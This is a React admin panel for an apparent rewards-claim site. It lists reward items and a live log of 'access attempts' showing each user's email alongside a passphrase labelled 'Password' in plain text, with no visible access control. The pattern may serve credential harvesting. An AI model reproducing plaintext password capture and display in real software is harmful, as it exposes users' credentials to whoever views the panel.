import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Shield, Upload, Users, Settings, LogOut, Eye } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';

interface AccessAttempt {
  id: string;
  email: string;
  passphrase: string;
  item_name: string;
  timestamp: string;
  status: 'success' | 'failed';
}

interface RewardItem {
  id: number;
  name: string;
  description: string;
  rarity: 'Legendary' | 'Epic' | 'Rare';
  image_url: string;
}

const AdminPanel = () => {
  const [accessAttempts, setAccessAttempts] = useState<AccessAttempt[]>([]);
  const [items, setItems] = useState<RewardItem[]>([]);
  const [selectedFiles, setSelectedFiles] = useState<{ [key: number]: File | null }>({});
  const { toast } = useToast();

  // Fetch access attempts
  useEffect(() => {
    const fetchAccessAttempts = async () => {
      const { data, error } = await supabase
        .from('access_attempts')
        .select('*')
        .order('timestamp', { ascending: false });
      
      if (error) {
        console.error('Error fetching access attempts:', error);
        return;
      }
      
      setAccessAttempts(data?.map(attempt => ({
        ...attempt,
        status: attempt.status as 'success' | 'failed'
      })) || []);
    };

    fetchAccessAttempts();

    // Real-time subscription for access attempts
    const attemptsChannel = supabase
      .channel('access-attempts-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'access_attempts'
        },
        () => fetchAccessAttempts()
      )
      .subscribe();

    return () => {
      supabase.removeChannel(attemptsChannel);
    };
  }, []);

  // Fetch items
  useEffect(() => {
    const fetchItems = async () => {
      const { data, error } = await supabase
        .from('items')
        .select('*')
        .order('id');
      
      if (error) {
        console.error('Error fetching items:', error);
        return;
      }
      
      setItems(data?.map(item => ({
        ...item,
        rarity: item.rarity as 'Legendary' | 'Epic' | 'Rare'
      })) || []);
    };

    fetchItems();

    // Real-time subscription for items
    const itemsChannel = supabase
      .channel('items-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'items'
        },
        () => fetchItems()
      )
      .subscribe();

    return () => {
      supabase.removeChannel(itemsChannel);
    };
  }, []);

  const handleFileSelect = (itemId: number, file: File | null) => {
    setSelectedFiles(prev => ({
      ...prev,
      [itemId]: file
    }));
  };

  const handleImageUpdate = async (itemId: number) => {
    const file = selectedFiles[itemId];
    if (!file) {
      toast({
        variant: "destructive",
        title: "No file selected",
        description: "Please select an image file first.",
      });
      return;
    }

    try {
      // For now, we'll just use a placeholder URL since storage isn't set up
      // In production, you'd upload to Supabase Storage
      const imageUrl = URL.createObjectURL(file);
      
      const { error } = await supabase
        .from('items')
        .update({ image_url: imageUrl })
        .eq('id', itemId);

      if (error) throw error;

      toast({
        title: "Image Updated",
        description: `Item ${itemId} image has been updated successfully.`,
        className: "border-primary bg-card text-foreground",
      });
    } catch (error) {
      console.error('Error updating image:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to update image.",
      });
    }
  };

  const handleLogout = () => {
    // Implement logout logic
    toast({
      title: "Logged out",
      description: "You have been logged out successfully.",
    });
  };

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-gradient-to-r from-primary to-accent rounded-full flex items-center justify-center glow-pulse">
              <Shield className="w-6 h-6 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-2xl font-bold text-primary">Admin Control Panel</h1>
              <p className="text-sm text-muted-foreground">Manage rewards and monitor access attempts</p>
            </div>
          </div>
          <Button onClick={handleLogout} variant="outline" className="border-destructive text-destructive hover:bg-destructive hover:text-destructive-foreground">
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Image Management */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Upload className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Item Management</h2>
            </div>
            
            <div className="space-y-4">
              {items.map((item) => (
                <div key={item.id} className="flex items-center gap-4 p-4 bg-muted/30 rounded-lg">
                  <div className="w-12 h-12 rounded overflow-hidden flex-shrink-0">
                    <img 
                      src={item.image_url} 
                      alt={item.name}
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div className="flex-1">
                    <Label className="text-sm font-medium">{item.name}</Label>
                    <Input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleFileSelect(item.id, e.target.files?.[0] || null)}
                      className="mt-1 text-xs"
                    />
                  </div>
                  <Button
                    onClick={() => handleImageUpdate(item.id)}
                    size="sm"
                    className="btn-royal"
                    disabled={!selectedFiles[item.id]}
                  >
                    Update
                  </Button>
                </div>
              ))}
            </div>
          </Card>

          {/* Access Monitoring */}
          <Card className="card-premium">
            <div className="flex items-center gap-2 mb-6">
              <Eye className="w-5 h-5 text-primary" />
              <h2 className="text-xl font-semibold text-foreground">Access Attempts</h2>
            </div>
            
            <div className="space-y-3 max-h-96 overflow-y-auto">
              {accessAttempts.map((attempt) => (
                <div key={attempt.id} className="p-4 bg-muted/30 rounded-lg">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-medium text-foreground">{attempt.email}</span>
                    <span className={`px-2 py-1 rounded-full text-xs font-semibold ${
                      attempt.status === 'success' 
                        ? 'bg-green-500/20 text-green-400' 
                        : 'bg-red-500/20 text-red-400'
                    }`}>
                      {attempt.status}
                    </span>
                  </div>
                  <div className="text-sm text-muted-foreground space-y-1">
                    <p><strong>Item:</strong> {attempt.item_name}</p>
                    <p><strong>Password:</strong> {attempt.passphrase}</p>
                    <p><strong>Time:</strong> {new Date(attempt.timestamp).toLocaleString()}</p>
                  </div>
                </div>
              ))}
              {accessAttempts.length === 0 && (
                <div className="text-center text-muted-foreground py-8">
                  No access attempts yet
                </div>
              )}
            </div>
          </Card>
        </div>

        {/* Statistics */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
          <Card className="card-premium text-center">
            <div className="p-6">
              <Users className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{accessAttempts.length}</h3>
              <p className="text-sm text-muted-foreground">Total Attempts</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Shield className="w-8 h-8 text-green-400 mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">
                {accessAttempts.filter(a => a.status === 'success').length}
              </h3>
              <p className="text-sm text-muted-foreground">Successful Claims</p>
            </div>
          </Card>
          
          <Card className="card-premium text-center">
            <div className="p-6">
              <Settings className="w-8 h-8 text-primary mx-auto mb-2" />
              <h3 className="text-2xl font-bold text-foreground">{items.length}</h3>
              <p className="text-sm text-muted-foreground">Active Items</p>
            </div>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;